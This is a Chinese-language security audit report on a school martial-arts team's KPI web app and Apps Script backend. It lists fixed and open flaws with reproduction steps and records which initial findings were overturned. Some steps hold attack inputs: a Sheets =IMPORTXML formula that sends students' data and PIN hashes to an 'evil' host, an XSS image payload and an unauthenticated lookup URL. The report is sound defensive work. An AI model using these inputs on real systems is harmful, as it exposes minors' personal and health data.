# AUDIT_REPORT — 育林國中技擊隊 KPI 系統

稽核日期：2026-08-12
稽核方式：五組平行稽核（QA / Security / Data / UX / Architecture）＋ Lead Engineer 逐項複驗
稽核對象：`index.html`、`js/01–13`、`kpi-session.js`、`monthly-report.js`、`psych-cards.js`、`service-worker.js`、`apps-script/Code.gs`（3926 行）

> **複驗原則**：本報告中標示「已複驗」的項目，都是 Lead Engineer 自行讀原始碼確認過的，
> 不是採信稽核員轉述。未能靜態確認的一律標 `NOT VERIFIED` 並寫明擁有者該去哪裡查，
> 不假裝通過。部分稽核員的初判在複驗後被**下修或推翻**，也一併記錄理由。

---

## 統計

| 等級 | 數量 | 已修 | 未修 |
|---|---|---|---|
| P0 | 7 | **7** | 0 |
| P1 | 10 | **6** | 4 |
| P2 | 17 | **4** | 13 |
| P3 | 4 | 1 | 3 |

**已修 P0**：B-01、B-02、B-03、B-04、C-01、C-02、C-03
**已修 P1**：B-05、B-08、A-02、A-03、D-08、E-01、LEAD-01
**已修 P2/P3**：B-09、E-08、A-05、D-09、A-04(PWA 重載)、LEAD-02

---

## P0 — 個資外洩／權限繞過／資料遺失

| ID | 等級 | 模組 | 問題 | 重現方式 | 根本原因 | 修正方式 |
|---|---|---|---|---|---|---|
| **B-01** | P0 ✅已修 | 後端身分驗證 | **舊制登入等於完全沒有驗證。** `authorizedStudentName()` 只要收到用戶端自稱的 `legacyRole` + `legacyName` 就核可身分（原 Code.gs:983-987）；`mentalSession_()`（原 3052）同樣如此，而它守的是焦慮分數、負面自我對話、賽後反思。`legacyLoginEnabled()` 原本是 `!== 'false'`，**預設開啟**。 | 瀏覽器貼上 `<WEB_APP_URL>/exec?action=getRecentRecordsByName&legacyRole=student&legacyName=<姓名>`。`/exec` 網址公開在 `js/01-config-data.js`，選手姓名同隊皆知。**無需 PIN、無需 token。** | 用戶端送來的字串被當成身分憑證。姓名不是機密，不能當認證因子。 | 移除 `authorizedStudentName`、`mentalSession_`、`updateRecordAuthorized`、`addRecord` 授權、`saveStudentTrait`、`getAppData`、`setAppDataAuthorized` 全部 7 條 legacy 分支；`legacyLoginEnabled()` 改為 `=== 'true'`（預設關閉）；前端 `postToWebApp` 不再送 legacy 欄位。 |
| **B-02** | P0 ✅已修 | `updateRecordAuthorized` | 舊制分支直接 `updateRecord(data.recordId, ...)`，`recordId` 全由用戶端指定，**不檢查這筆紀錄是不是你的**（原 Code.gs:1449-1456）。 | 帶任意 `recordId` + `legacyRole` 即可改寫他人紀錄的 `studentResponse`／`parentNote`。 | 欄位白名單擋的是「改哪個欄位」，擋不住「改誰的紀錄」。 | 移除該分支，一律要求真實 session。 |
| **B-04** | P0 ✅已修 | `checkAdminKey()` | **Fail open。** 原本 `if (!key) return true;` —— `ADMIN_KEY` 未設定（預設狀態）時任何人都是管理員（原 Code.gs:3876-3880）。守的是 `pushLineText`、`setLineConfigFromRequest`、`setRoster`（會整份覆寫選手名單）與 `setAppData`。 | Script Properties 未設 `ADMIN_KEY` 時，未驗證呼叫 `setRoster` 即可覆寫全隊名單。 | 安全預設值寫反：沒設密碼應該是拒絕，不是放行。 | 改為「有效教練 session 或正確 ADMIN_KEY」才通過，未設定一律拒絕；比對改用既有的 `safeEqual()` 防時序。 |
| **B-03** | P0 ✅已修 | 教練後台 XSS | `${r.name}` 未跳脫寫進 `innerHTML`（js/07-coach-dashboard.js:1390）；`placeholder="給 ${r.name} …"` 在 HTML 屬性內未跳脫（同檔 1440）。同檔其餘 77 處都有用 `escapeHtml`，屬漏網。經 B-01 可寫入惡意姓名後，可在教練瀏覽器竊取 localStorage 內的 `authToken`。 | 送出一筆 `name` 為 `<img src=x onerror=...>` 的紀錄，教練開後台即執行。 | 單點遺漏跳脫。 | 兩處補 `escapeHtml`。 |
| **C-01** | P0 ✅已修 | `student_accounts` | **一般讀取路徑會自動永久刪除帳號列。** `dedupeStudentAccounts()`（Code.gs:689-725）只以 `normalizeName(studentName)` 分組，同名即 `deleteRow`。它被 `syncStudentAccountsFromRoster()` 呼叫，而後者掛在 `getAccountAdminData`(1742)、`activeStudentAccounts`(2377)、`loadKpiStudentsLight_`(2548) 這些教練日常操作上。原註解宣稱「被刪的通常是空帳號，安全」，但 `score()` 從未驗證這件事。 | 兩位同名選手（國中極常見）都有帳號 → 教練開帳號管理或 KPI 名單 → 其中一人的 PIN／狀態／鎖定紀錄整列消失，無法復原。 | 去重鍵只有姓名字串，且採硬刪。 | 移出自動路徑；改為只刪「可證明的空殼」（無 PIN、從未登入、狀態 pending），其餘回報 `needsReview` 交教練人工判斷。 |
| **C-02** | P0 ✅已修 | Google Sheet 公式注入 | 全檔零防護（`sanitize`/`setNumberFormat` 命中數 = 0）。所有自由文字經 `appendRow`/`setValues` 寫入，Sheets 會把 `=`/`+`/`-`/`@` 開頭的字串當**活公式**求值。 | 選手在「今日心得」輸入 `=IMPORTXML("https://evil/?d="&A2&B2,"//x")`，即可把同表其他選手的體重、疼痛、PIN 雜湊送到外部網址。 | 寫入路徑未做型別／前綴防護。 | 新增 `sanitizeCellValue_()`（危險前綴加半形單引號強制文字，非字串型別原樣通過），套用於 11 處寫入點。已加 5 項單元測試。 |
| **C-03** | P0 ✅已修 | `addRecord()` 併發 | read-check-write 無鎖（全檔唯一的 `LockService` 在 2684，只保護每週 KPI）。掃表本身要讀 700+ 列 × 157 欄，race window 很大。 | 訊號不佳時連點兩下送出 → 兩個執行實例都判定「今天還沒有」→ 各自 append → 同人同日兩筆，出席人數多算。 | 缺互斥鎖。 | 加 `LockService.getScriptLock()`（15 秒 tryLock，try/finally 釋放）；同時把比對讀取從「整表 157 欄」縮到「只讀 name/date 兩欄」，順帶移除 6 分鐘逾時的主因。 |

---

## P1 — 無法登入／無法送出／教練後台錯誤／資料串錯

| ID | 等級 | 模組 | 問題 | 重現方式 | 根本原因 | 修正方式 |
|---|---|---|---|---|---|---|
| **B-05** | P1 ✅已修 | `doGet` | 所有動作都能用一條 GET 網址觸發（Code.gs:228-236），且 query string 會留在瀏覽器歷史與日誌。 | 貼一條含 `?action=` 的連結即可送達攻擊。 | `doGet` 把 `e.parameter` 原封不動交給 `handleAction`。 | 加入 GET 白名單，僅保留 `ping`／`getAuthConfig`（皆不回傳個資）。前端一律走 POST，不受影響。 |
| **A-01** | P1 | 重複送出 | 每次送出都產生新的 `recordId`，前端不帶「要取代哪一筆」的資訊（js/04-daily-submit.js:190-192, 341-349）。目前靠後端 name+date upsert 兜住。 | 同日送出兩次。 | 前端沒有 idempotency 概念。 | 送出時帶穩定的 `clientRequestId`（可重用既有 `recordId`），後端 `addRecord` 優先以此判定重送。**與 C-03 的鎖搭配才完整。** |
| **A-02** | P1 | 送出流程 | `doSubmit()` 只有 `finally` 沒有頂層 `catch`（js/04-daily-submit.js:325-355），且全站原本沒有 `onerror`／`unhandledrejection`。任何同步例外會完全靜默。 | 送出過程中任一 render 函式丟例外 → 畫面就停在那裡，使用者以為「閃退」。 | 缺頂層錯誤處理與全域攔截。 | 已新增 `js/00-error-guard.js`（全域攔截＋本機黑盒子＋教練看得懂的橫幅）；**尚待**在 `doSubmit` 加頂層 catch 並掛載該腳本到 `index.html`。 |
| **A-03** | P1 | 表單驗證 | `sleepHours` 是 `type="hidden"` 且被 `validateForm()` 列為必填，但來源欄位 `bedTime`／`wakeTime` 不在必填清單（index.html:237、js/03-forms-scoring.js:1402-1427）。 | 兩個時間都不填 → 跳錯誤 → `.focus()` 作用在隱藏元素上（無效）→ 學生看到一個**無法解決**的錯誤。 | 驗證對象是衍生的隱藏欄位，而非使用者實際操作的欄位。 | 必填改判 `bedTime`/`wakeTime`，錯誤聚焦到 `bedTime`。 |
| **D-08** | P1 | 送出結果回饋 | 正式送出失敗後，仍然渲染完整的「成功」回饋卡；主送出鈕 `btnSubmit` 從不檢查 `doSubmit` 的回傳值（js/04-daily-submit.js:397-427、js/10-init.js:106）。 | 關掉網路後按送出：toast 說失敗，但底下照樣出現 AI 回饋卡與 LINE 文案。 | 成功路徑與失敗路徑共用同一段 render，且回傳值被丟棄。 | 依 `saved` 決定是否渲染成功卡；失敗時顯示「資料尚未送出」與重試鈕。 |
| **C-04** | P1 | 身分識別 | `addRecord` 的 upsert 只比對姓名字串，不用已存在的 `studentId`（Code.gs:1499）；`getLastRecordByName`／`getRecentRecordsByName` 同樣以姓名查詢。 | 教練替選手改名 → 當日新增一列而非更新；改名前的歷史查不到。 | `records` 事實上以姓名為主鍵。 | 改為「有 `studentId` 用 `studentId`，沒有才 fallback 姓名」，可完全比照已正確實作的 `recordsForIdentity()`（Code.gs:991-997）。 |
| **C-05** | P1 | 時區（後端） | KPI 預設 21:00 截止（Code.gs:2183）與伺服器「今天」判斷依賴 Apps Script 專案時區；repo 內無 `appsscript.json`。 | 專案時區若非 Taipei，KPI 會在錯誤時間開關。 | 關鍵設定不在版控內。 | **NOT VERIFIED** — 需擁有者到 Apps Script「專案設定」確認時區為 `(GMT+08:00) Taipei`，並另外確認 Google Sheet 本身的試算表時區（兩者是獨立設定）。建議新增 `appsscript.json` 明寫 `"timeZone": "Asia/Taipei"` 納入版控。 |
| **LEAD-01** | P1 | 時區（前端） | `normDate()`（js/02-core-utils.js:100-115）用 `new Date(s)` + `getFullYear/getMonth/getDate`，也就是**執行裝置的本地時區**，不是固定 Asia/Taipei。**已實測**：同一筆 Sheet 資料在 `TZ=Asia/Taipei` 回 `2026-06-03`，在 `TZ=UTC` 回 `2026-06-02`。 | 教練出國、或任何裝置時區非 +08:00 → 整份報表日期差一天。 | 日期正規化依賴裝置時區。 | 改用固定 +08:00 偏移計算。**注意**：在台灣裝置上目前行為是正確的，所以這是潛在缺陷而非現行災難——Teammate A 判定「無日期偏移 bug」在台灣裝置的前提下是對的，但沒有涵蓋非台灣時區。已寫成 `todo` 測試（tests/unit/date.test.js）。 |
| **B-07** | P1 | LINE 管理密碼 | 明文長期存在 `localStorage`（js/09-settings-auth.js:221-222）。 | 任何取得教練裝置或透過 XSS 的人可直接讀取。 | 敏感憑證存於瀏覽器持久儲存。 | 改為只存在記憶體、或每次操作時要求輸入。 |
| **B-08** | P1 | 角色旗標 | 前端 `ROLE_KEY` 的角色值曾被後端 legacy 路徑當成身分依據。 | — | 同 B-01。 | 已隨 B-01 修復；前端角色現在只影響顯示，不再影響後端授權。 |

---

## P2 — UX／手機版／PWA／效能／錯誤處理

| ID | 等級 | 模組 | 問題 | 根本原因 | 修正方式 |
|---|---|---|---|---|---|
| **D-04** | P2 | 教練戰情室 | **「今日戰情室」是死的 UI。** `#coachWarRoomGrid`/`#coachWarRoomList` 位於 `<div class="coach-legacy-bins" hidden>`（index.html:907-915），且 `style.css:137` 有 `display:none!important`，但 `renderCoachWarRoom()` 每次刷新照樣計算並寫入不可見元素。 | 改版時被隱藏，計算未一併移除。 | 隨 War Room 首屏重整一併處理（見任務 #6）。 |
| **D-05** | P2 | 教練首屏 | 教練先看到的是 8 個純數字磚（js/07-coach-dashboard.js:1071-1082），真正有名字、可行動的清單 `renderRedLightCoaching` 在更下方，且**沒有 3–5 人上限**，紅黃混在一起。**30 秒測試不通過。** | 資訊層級未依「該找誰」設計。 | 首屏改 🔴必須處理(≤5人)／🟡要注意／🟢正常(收合)。 |
| **D-06** | P2 | 教練訊號 | 「誰連續缺席」全系統從未實作；`computeAlerts()`（1902-1937）的輸出目標也在隱藏區塊內。 | 功能缺口。 | 補算連續缺席並納入首屏。 |
| **A-04** | P2 | PWA | `controllerchange` 無條件 `window.location.reload()`（index.html:1186）＋ SW 的 `skipWaiting()`+`clients.claim()`（service-worker.js:24,31）＋ 每次載入都 `reg.update()`。首次安裝必定觸發一次重載；瀏覽器背景更新檢查則會在**使用中隨機重載**。裝成桌面 PWA 時表現為「閃一下回到開頭」。 | 缺 `refreshing` 旗標與「原本就有 controller 才重載」判斷。 | 加旗標與判斷；或改為顯示「有新版本，點此更新」由使用者決定。 |
| **A-05** | P2 | 教練後台 | `btnRefreshCoach` → `refreshCoach()` 無 in-flight 保護（js/10-init.js:156），連點會對已知偏慢的 GAS 後端發出多個重量級 `getAllRecords`。 | 缺請求去重。 | 加 in-flight 旗標＋按鈕 disabled。 |
| **A-06** | P2 | 手機觸控 | 全站 `.chip` 高度僅約 24–26px（style.css:996-1003，padding 5px 12px 且無 min-height），遠低於 44px 建議值。 | 未設最小觸控尺寸。 | 加 `min-height:44px`。 |
| **D-09** | P2 | 錯誤訊息 | 教練後台載入失敗時直接顯示原始 `e.message`（js/07-coach-dashboard.js:985）。 | 違反「教練不看技術訊息」原則。 | 改為人話訊息＋重試鈕，technical detail 留 console。 |
| **D-01** | P2 | 學生表單 | 必填的早／午／晚餐藏在**預設收合**的 `<details>` 裡（index.html:311-329）。 | 分層與必填衝突。 | 三餐改非必填、或移出收合區。 |
| **D-02** | P2 | 學生表單 | 學制／年級／班級三個選單的自動帶入程式碼是死的，實際從不生效（js/10-init.js:392-409, 411-417）。 | 死碼。 | 修好或移除。 |
| **B-09** | P2 ✅已修 | 版控衛生 | `key.txt` 存在於 repo 根目錄且**未列入 `.gitignore`**（目前為空檔、未追蹤）。全git 歷史 181 個 commit 掃描**未發現**硬編秘密。 | 命名危險的檔案未被忽略。 | 已加入 `.gitignore`（含 `*.key`、`.env*`、`node_modules/`）。 |
| **E-01** | P1 ✅已修 | 本機備份 | `saveLocalRecord()`（js/02-core-utils.js:45-49）在**正式送出路徑**也會執行，且 (a) 無上限 push、每筆 2.5–5KB、永不清理，(b) `setItem` 無 try/catch。配額滿時 `QuotaExceededError` 會丟進非同步的 `doSubmit`，讓後面的 AI 回饋卡／LINE 文案／成長卡全部不執行 —— **資料其實已寫入 Google Sheet，但畫面就停住**。這正是「送出後沒反應／閃退」的主要成因之一。 | 長期使用同一台裝置後送出。 | 改為保留最近 120 筆、寫入失敗回傳 false 而非丟例外；並在 `doSubmit` 加頂層 catch。 |
| **E-02** | P2 | 首次載入重量 | `yulinlogo.jpg` 為 2152×1879px / 436KB，實際顯示尺寸僅 96×96px，約浪費 420KB。首次載入總計 **≈2.29 MB**（JS 809KB＋CSS 123KB＋html2pdf CDN 906KB＋圖片 489KB＋HTML 69KB）。 | 未針對顯示尺寸壓縮。 | 產生 192px 版本；html2pdf 改為只在教練點「月報」時動態載入（可省 906KB，佔總量 40%）。 |
| **E-03** | P2 | N+1 請求 | `generatePendingActivationCodes`（js/09-settings-auth.js:988-994）每位選手發一次 POST。 | 迴圈內逐一請求。 | 改為單一批次動作。 |
| **E-05** | P2 | 重複邏輯 | `cleanLight`（js/12-research-data.js:71）與 `cleanLightForCoach`（js/07-coach-dashboard.js:1085）位元組完全相同。 | 意外複製。 | 合併為一份。（已確認 `judgeStatus` 與 `specBodyLight` 是**刻意**不同，不在此列。） |
| **E-08** | P2 ✅已修 | localStorage 成長 | `yulin_local_records` 無上限成長（對照 `saveCoachReplyStore` 有做 `.slice(0,300)`）。 | 同 E-01。 | 已加 120 筆上限。 |
| **E-12** | P2 | 前後端模型漂移 | 後端 HEADERS 有 16 個自由品勢評分欄位**沒有任何前端生產者**。 | 未完成的功能，非資料遺失。 | 補齊前端或從 HEADERS 標註為保留欄位（**不可刪除**，會影響既有列）。 |
| **E-11** | P3 | 死 CSS | 三組完全無用的元件樣式（style.css:1562-1624、853-870、1645-1665，約 110+ 個選擇器）來自已被取代的舊 UI。 | 改版未清理。 | 刪除。 |

---

## P3

| ID | 等級 | 問題 | 修正方式 |
|---|---|---|---|
| **LEAD-02** | P3 ✅已修 | `tobs-`/`tnext-` 元素 id 產生時用 `escapeHtml(r.name)`，查詢時卻用原始 `r.name`（js/07-coach-dashboard.js:1876-1877 vs 1888-1889）→ 姓名含 `& < > " '` 的選手會查不到元素而丟例外。 | 查詢端改用同樣的 `escapeHtml`，並加 null 防護。 |
| **A-07** | P3 | `#name` change handler 有典型 async race（舊回應可覆寫新選手的自動帶入，js/10-init.js:60-71）。目前不可觸發，因 `applyRole()` 對選手／家長停用該欄位。 | 加請求序號防護（防禦性）。 |
| **D-03** | P3 | 痠痛／RPE／疼痛滑桿有預設值且無「是否碰過」檢查，可能整批送出預設值而非真實感受。 | 加 touched 檢查或改為未選狀態。 |

---

## 經複驗後被**下修或推翻**的判斷

誠實記錄，避免報告灌水：

| 原判 | 複驗結論 |
|---|---|
| **B-06（P1）**：前端刻意用 `text/plain` POST 規避 CORS preflight，造成 CSRF 風險 | **下修至 P3（資訊）。** 已複驗 `postToWebApp`（js/09-settings-auth.js:337-347）：`authToken` 是從 localStorage 取出後放進 **request body**，不是 cookie。跨站攻擊者讀不到 localStorage，也就無法提供有效 token，**對已驗證動作無法利用**。殘餘風險只存在於「不需驗證即可執行的動作」，而那些已由 B-01/B-04 修復關閉。 |
| **C-03 評為 P0** | 維持修復，但務實評級介於 P0/P1：`addRecord` 既有的 name+date upsert 已能處理多數連點情境，真正產生重複列需要併發視窗。因修復成本低（6 行）且影響 40 人每日使用，仍優先處理。 |
| **A：「無 UTC/本地日期偏移 bug」** | **部分推翻。** 在台灣裝置上結論正確，但 `normDate` 確實依賴裝置時區，非台灣時區會整批差一天（見 LEAD-01，已實測）。 |
| **D：家長端個資外洩** | **未發現確認的外洩。** `coachPrivateNote`、解憂信箱、原始心理分數、他人資料、體重／尿液／傷勢細節皆正確不出現在家長視圖（js/07-coach-dashboard.js:423-491、js/13-mental-preparation.js:712-723）。唯一灰色地帶：`applyRole()` 對家長角色仍呼叫 `loadProfile()`（js/09-settings-auth.js:811-814），但找不到可見路徑，列為 P3 防禦缺口而非外洩。 |
| **C-09：欄位順序錯位風險** | **確認為既有設計優點。** 全檔無硬編欄位索引，`ensureSchema()`／`getSheetWithHeaders()` 在每次讀寫時自動補欄補表頭且不動資料列 —— 「改了 HEADERS 但忘記跑 setupSheet」這個典型 P0 情境在本系統結構上不會發生。 |
| **A-01：「送出沒有 in-flight 保護」** | **部分推翻。** 複驗 js/04-daily-submit.js:326-338 確認**已有** `_submitting` 旗標與三顆送出鈕的 `disabled` 鎖定，且 344-349 有「今天已填過，要覆蓋嗎」的確認。真正缺的是後端併發鎖（C-03，已修）與前端 idempotency key（仍待補）。 |
| **A：「init() 中途丟例外導致半殘」（我自己的初始假設）** | **實測推翻。** Playwright 在 Chrome 桌面與行動模擬下各跑一次乾淨載入，`pageerror` 為 0、`#date` 有被 `init()` 正確設值、無 404、375/390/430px 均無橫向溢出。開頁不是閃退的成因；成因在送出流程（E-01）與 PWA 重載（A-04）。 |
| **E：全域命名衝突** | **確認為零。** 掃描 11 個共用全域作用域檔案的 549 個頂層宣告，無任何真實衝突。（兩個 `window.onload` 命中位於 `document.write()` 的彈出視窗字串內，不影響主頁面。） |

---

## NOT VERIFIED — 必須由擁有者現場確認

這幾項無法從原始碼靜態判定，**不列入任何「通過」統計**：

1. **Apps Script 專案時區** — 編輯器 → 專案設定 → 確認 `(GMT+08:00) Taipei`。
2. **Google Sheet 試算表時區** — 檔案 → 設定 → 地區與時區（與上一項是**兩個獨立設定**）。
3. **`ADMIN_KEY` 是否已設定** — 修復後未設定即為「拒絕」，若教練有在用 ADMIN_KEY 流程，必須先去 Script Properties 設定，否則相關動作會開始回報無權限。
4. **`LEGACY_LOGIN_ENABLED` 現值** — 預設已改為關閉。
5. **`student_accounts` 是否已有選手被 C-01 誤刪** — 人工比對現有列數與實際選手數；若有選手反應「PIN 突然失效／帳號消失」，優先懷疑此項。
6. **`records` 是否已中過公式注入** — 用 Sheet 的「尋找」搜 `=IMPORTXML`、`=HYPERLINK`、`=IMPORT`，確認歷史資料是否已被污染（防護只對未來寫入生效）。
